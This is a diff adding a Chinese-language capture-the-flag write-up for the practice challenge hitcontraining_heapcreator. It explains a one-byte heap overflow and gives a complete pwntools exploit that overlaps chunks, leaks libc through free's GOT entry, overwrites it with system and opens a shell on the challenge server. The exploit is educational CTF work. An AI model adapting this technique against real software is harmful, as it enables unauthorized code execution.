@@ -326,3 +326,95 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+
+### hitcontraining_heapcreator
+
+[题目链接](https://buuoj.cn/challenges#hitcontraining_heapcreator)
+
+先随便申请两个块看看，发现依旧是 manage_chunk + user_chunk 模式，manage_chunk 按顺序放了 0，manage_chunk 的大小，user_chunk 的 user_data 部分大小，user_data 的起始地址。
+
+IDA 在 delete() 函数中找到了 `*(&heaparray + n0xA) = 0;` 每次删除 chunk 都会把指针置为 0，宣布 uaf 死掉了。
+
+在 edit_heap() 函数找到了限制栈溢出的代码：`read_input(*((_QWORD *)*(&heaparray + n0xA) + 1), *(_QWORD *)*(&heaparray + n0xA) + 1LL);`
+
+第一个参数是地址，QWORD + 1 代表管理 chunk 的 user_data 按照 64 位 后移一位存放的数据，就是 user_chunk 的 user_data 的起始地址。
+
+第二个参数是长度，这里最后 +1LL，代表可以输入 user_data 的长度 +1 的长度，也就是存在 1 字节的溢出空间，称为 One-byte-overflow 漏洞。
+
+初步思路是申请 chunk_0,chunk_1,chunk_2，通过单字节溢出可以修改 chunk_1 的 manage_chunk 大小，让 manage_chunk_1 包裹 user_chunk_1 和 manage_chunk_2，这样 delete() 的时候会把他们一起放入 bins，然后 malloc() 一个一样大小的就可以修改manage_chunk_2，使 manage_chunk_2 存储的 user_chunk_2_user_data 起始地址改为 free_got，edit user_chunk_2，就可以修改 free_got 表的内容。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+host = "node5.buuoj.cn"
+port = 29025
+io = remote(host,port)
+# io = process("./heapcreator")
+elf = ELF("./heapcreator")
+libc = ELF("./libc-2.23.so")
+free_got = elf.got['free']
+# heaparray = 0x6020A0
+
+def create(size,content):
+    io.recvuntil(b"Your choice :")
+    io.sendline(b'1')
+    io.recvuntil(b"Size of Heap : ")
+    io.sendline(str(size).encode())
+    io.recvuntil(b"Content of heap:")
+    io.send(content)
+
+def edit(index,content):
+    io.recvuntil(b"Your choice :")
+    io.sendline(b'2')
+    io.recvuntil(b"Index :")
+    io.sendline(str(index).encode())
+    io.recvuntil(b"Content of heap : ")
+    io.send(content)
+
+def show(index):
+    io.recvuntil(b"Your choice :")
+    io.sendline(b'3')
+    io.recvuntil(b"Index :")
+    io.sendline(str(index).encode())
+
+def delete(index):
+    io.recvuntil(b"Your choice :")
+    io.sendline(b'4')
+    io.recvuntil(b"Index :")
+    io.sendline(str(index).encode())
+
+def main():
+    create(0x78,b"AAAA")    # index 0
+    create(0x20,b"BBBB")    # index 1 
+    create(0x20,b'CCCC')    # index 2 for guard
+    payload_0 = b'D'*0x78 + b'\x71' # manage_chunk_1 (0x20) + user_chunk_1 (0x30) + manage_chunk_2_header(0x18) = 0x68 向上取整 → 0x71
+    edit(0,payload_0)
+    # gdb.attach(io)
+    delete(1)
+    create(0x60,b'EEEEEEEE')
+    payload_1 = b'F'*0x10 + b'G'*0x30 + p64(0) + p64(0x21) + p64(0x20) + p64(free_got)
+    # manage_chunk_1_tail(0x10) + user_chunk_1 (0x30) + manage_chunk_2_header(0x20 → 0 + manage_chunk_size + user_data_size + user_data_addr)
+    edit(1,payload_1)
+    # gdb.attach(io)
+    # edit(2)
+    show(2)
+    io.recvuntil(b"Content : ")
+    leak_data = io.recvline().strip()
+    leak_data = leak_data.ljust(8,b'\x00')
+    free_addr = u64(leak_data)
+    print("\n [+] Leak free address :",hex(free_addr))
+    libc_base = free_addr - libc.sym['free']
+    print("\n [+] Leak libc base address :",hex(libc_base))
+    system = libc_base + libc.sym['system']
+    print("\n [+] Leak system address :",hex(system))
+    edit(2,p64(system))
+    edit(0,b"/bin/sh\x00")
+    delete(0)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
